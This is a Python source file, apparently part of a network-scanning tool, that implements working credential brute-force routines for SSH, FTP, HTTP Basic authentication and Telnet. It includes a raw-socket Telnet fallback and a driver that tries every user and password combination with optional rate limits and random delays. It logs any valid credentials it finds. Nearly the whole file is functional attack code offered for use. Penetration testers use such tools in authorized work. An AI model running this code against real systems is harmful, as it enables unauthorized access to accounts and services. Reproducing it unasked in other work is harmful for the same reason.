"""
Brute-force modules — SSH, FTP, HTTP Basic, Telnet (raw socket fallback).
"""
from __future__ import annotations

import base64
import ftplib
import http.client
import logging
import random
import socket
import time
from typing import Callable, Dict, List, Optional

from promapper.config import cfg, _get_ssl_ctx, SSL_PORTS

logger = logging.getLogger(__name__)

try:
    import telnetlib
    HAS_TELNETLIB = True
except ImportError:
    HAS_TELNETLIB = False

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False


def _http_conn(host: str, port: int, timeout: float) -> http.client.HTTPConnection:
    if port in SSL_PORTS:
        return http.client.HTTPSConnection(host, port, timeout=timeout, context=_get_ssl_ctx())
    return http.client.HTTPConnection(host, port, timeout=timeout)


def brute_ssh(host: str, port: int, user: str, passwd: str,
              timeout_val: Optional[float] = None) -> bool:
    if not HAS_PARAMIKO:
        return False
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=user, password=passwd,
                       timeout=timeout_val or cfg().timeout, banner_timeout=5,
                       allow_agent=False, look_for_keys=False)
        client.close()
        return True
    except (paramiko.AuthenticationException, OSError, socket.timeout):
        return False
    except Exception as e:
        logger.debug("SSH brute error: %s", e)
        return False


def brute_ftp(host: str, port: int, user: str, passwd: str,
              timeout_val: Optional[float] = None) -> bool:
    try:
        ftp = ftplib.FTP(timeout=timeout_val or cfg().timeout)
        ftp.connect(host, port)
        ftp.login(user, passwd)
        ftp.quit()
        return True
    except (ftplib.error_perm, OSError, socket.timeout):
        return False
    except Exception as e:
        logger.debug("FTP brute error: %s", e)
        return False


def brute_http(host: str, port: int, user: str, passwd: str,
               timeout_val: Optional[float] = None, path: str = "/") -> bool:
    try:
        auth = base64.b64encode(f"{user}:{passwd}".encode()).decode()
        conn = _http_conn(host, port, timeout_val or cfg().timeout)
        conn.request("GET", path, headers={"Authorization": f"Basic {auth}"})
        resp = conn.getresponse()
        resp.read()
        conn.close()
        return resp.status not in (401, 403)
    except Exception:
        return False


def brute_telnet(host: str, port: int, user: str, passwd: str,
                 timeout_val: Optional[float] = None) -> bool:
    t = timeout_val or cfg().timeout
    if HAS_TELNETLIB:
        try:
            tn = telnetlib.Telnet(host, port, timeout=t)
            tn.read_until(b"login: ", timeout=5)
            tn.write(user.encode() + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(passwd.encode() + b"\n")
            time.sleep(0.5)
            result = tn.read_very_eager()
            tn.close()
            if not result:
                return False
            low = result.lower()
            return not any(x in low for x in [b"failed", b"incorrect", b"sername"])
        except (EOFError, OSError, socket.timeout):
            return False
        except Exception as e:
            logger.debug("Telnet brute error: %s", e)
            return False
    try:
        with socket.create_connection((host, port), timeout=t) as sock:
            sock.settimeout(5)
            data = b""
            while True:
                try:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    data += chunk
                    if b"login:" in data.lower():
                        break
                except socket.timeout:
                    break
            sock.send(user.encode() + b"\n")
            data = b""
            while True:
                try:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    data += chunk
                    if b"password:" in data.lower():
                        break
                except socket.timeout:
                    break
            sock.send(passwd.encode() + b"\n")
            time.sleep(0.5)
            try:
                resp = sock.recv(4096)
                low = resp.lower()
                return not any(x in low for x in [b"failed", b"incorrect", b"sername", b"denied"])
            except socket.timeout:
                return True
    except (OSError, socket.timeout):
        return False
    except Exception as e:
        logger.debug("Telnet brute error (raw): %s", e)
        return False


BRUTE_FUNCS: Dict[str, Callable[..., bool]] = {
    "ssh": brute_ssh, "ftp": brute_ftp, "http": brute_http, "telnet": brute_telnet,
}


def brute_force(host: str, port: int, service: str, users: List[str],
                passwords: List[str], timeout_val: Optional[float] = None) -> List[Dict[str, str]]:
    func = BRUTE_FUNCS.get(service)
    if func is None:
        return []
    found: List[Dict[str, str]] = []
    c = cfg()
    for user in users:
        for passwd in passwords:
            if c.rate_limit > 0:
                time.sleep(1.0 / c.rate_limit)
            if c.random_delay[0] > 0.0 or c.random_delay[1] > 0.0:
                time.sleep(random.uniform(*c.random_delay))
            if func(host, port, user, passwd, timeout_val):
                found.append({"user": user, "password": passwd})
                logger.info("Credentials found: %s:%s on %s://%s:%d", user, passwd, service, host, port)
    return found
